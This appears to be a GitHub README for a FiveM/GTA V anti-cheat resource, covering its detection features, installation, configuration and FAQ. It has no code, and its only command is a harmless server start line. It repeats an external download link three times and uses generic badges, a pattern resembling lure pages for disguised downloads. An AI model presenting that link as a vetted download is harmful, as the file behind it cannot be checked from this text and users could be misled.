# Fortify Anti-Cheat v2.0.0 - Game Script Utility 2026

> Anti-cheat resource for FiveM and GTA V servers, built to detect common cheating behavior and support moderation workflows through server-side controls and logging.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-FiveM-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/evan-young1994/fortify-anticheat-script-v2?style=flat-square)](https://github.com/evan-young1994/fortify-anticheat-script-v2)

---

<p align="center">
  <a href="https://evan-young1994.github.io/fortify-anticheat-script-v2/">
    <img src="https://img.shields.io/badge/Download-Fortify%20Anti-Cheat%20Script-brightgreen?style=for-the-badge" alt="Download Fortify Anti-Cheat Script">
  </a>
</p>

> **[Direct Download - Fortify Anti-Cheat](https://evan-young1994.github.io/fortify-anticheat-script-v2/)**

---

[Download Latest Build](https://evan-young1994.github.io/fortify-anticheat-script-v2/)

---

## What It Does

Fortify Anti-Cheat is a client-server resource for FiveM servers that watches for suspicious activity in GTA V multiplayer and reacts to common cheat patterns. It is meant to help server teams identify incidents, apply moderation actions, and preserve useful logs so reviews have more context.

In version 2.0.0, the focus is on better detection precision, improved stability, and reduced resource overhead. The package combines live checks, JSON-based ban persistence, and Discord logging so administrators can manage enforcement from one place while keeping the rule set adjustable for different server policies.

## Features

- Live cheat detection for active gameplay oversight
- Coverage for god mode, speed hacks, teleporting, noclip, invisibility, and super jump behavior
- Cleanup actions for illegal weapons and vehicles
- Blocking of explosion events tied to suspicious event handling
- Administrative commands for ban, unban, kick, warn, and spectate
- Persistent JSON ban storage with identifier cross-checks
- Discord webhook logging for detections and moderation actions
- Configurable detection modules and threshold settings

## Installation

1. Download the latest build from the project page.
2. Copy the resource folder into your FiveM server resources directory.
3. Register the resource in your server configuration so it starts with the rest of your resources.
4. Check the configuration file before going live to make sure detection settings, thresholds, and moderation actions fit your server rules.

Example server start entry:

    ensure fortify-anti-cheat-v2

If your folder name differs, update the `ensure` line to match your installation.

## Configuration

| Setting | Purpose | Example |
| --- | --- | --- |
| Detection modules | Enable or disable specific checks | `godmode = true` |
| Thresholds | Tune sensitivity for behavior checks | `speed_check_limit = 1.25` |
| Ban storage | Keep moderation records in JSON format | `ban_file = "bans.json"` |
| Discord webhook | Send detection and admin logs | `webhook_url = "YOUR_WEBHOOK_URL"` |
| Admin actions | Control available moderation commands | `allow_spectate = true` |
| Event blocking | Restrict specific suspicious events | `block_explosions = true` |

## Compatibility

Fortify Anti-Cheat is intended for FiveM servers running GTA V resources. It is built as a client-server resource, so deployment depends on your server structure and the way your resource manifest is organized.

Known limitations:
- Detection results depend on the settings you choose and the behavior being checked
- Some moderation actions require properly configured permissions on the server side
- Discord logging needs a valid webhook and network access
- Persistent bans rely on the JSON storage file remaining available to the resource

## FAQ

### How do I install it?
Download the release, copy the folder into your resources directory, and add an `ensure` line in your server config. Then review the settings before enabling it on a live server.

### How do I update from an older version?
Swap the current resource files for the newer build, then compare your configuration so any custom thresholds or logging settings carry over correctly.

### Can I customize detections?
Yes. The system includes configurable detection modules and thresholds, so you can adjust how strict individual checks should be.

### Does it work with any FiveM server?
It is designed for FiveM servers on GTA V. Your exact setup, permissions, and resource layout may affect how smoothly it integrates.

### Where are bans stored?
Bans are stored in JSON format, with identifier cross-checking used to help match records consistently across moderation actions.

### Can I change logging behavior?
Yes. Discord webhook logging can be configured to fit your server's moderation workflow or disabled if you do not want external logging.

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
